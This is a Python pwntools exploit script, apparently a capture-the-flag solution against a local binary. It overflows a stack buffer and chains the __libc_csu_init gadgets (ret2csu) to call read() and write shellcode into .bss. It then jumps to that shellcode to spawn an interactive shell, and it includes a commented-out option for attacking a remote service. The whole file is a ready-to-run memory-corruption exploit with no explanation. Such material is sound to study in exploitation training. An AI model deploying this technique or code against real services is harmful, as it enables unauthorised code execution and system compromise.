from pwn import *
import sys

def exploit():
	p1 =  cyclic(264)
	p1 += p64(init2)
	p1 += csu_init(elf.got['read'], 0, elf.bss() + 0x500, len(shellcode)+1, init1)
	p1 += csu_init(0, 0, 0, 0, elf.bss() + 0x500)

	p.sendline(p1)
	p.recv()
	p.sendline(shellcode)
	p.interactive()

def csu_init(func, arg1, arg2, arg3, returns):
	payload =  'A' * 8
	payload += p64(0) # rbx
	payload += p64(1) # rbp
	payload += p64(func) # r12
	payload += p64(arg1) # r13
	payload += p64(arg2) # r14
	payload += p64(arg3) # r15
	payload += p64(returns) # rip
	return payload

def main():
	global b, l, elf, p, shellcode, init1, init2

	context.log_level = 'debug'
	context.arch = 'amd64'

	b   = './binary'
	l   = './libc.so.6'
	elf = ELF(b)
	p   = process(b)
	# p = process(b, env={'LD_PRELOAD' : l})
	# p = remote('localhost', 8888)

	init1 = 0x400750 
	init2 = 0x400766
	shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64')

	exploit()

if __name__ == '__main__':
	main()
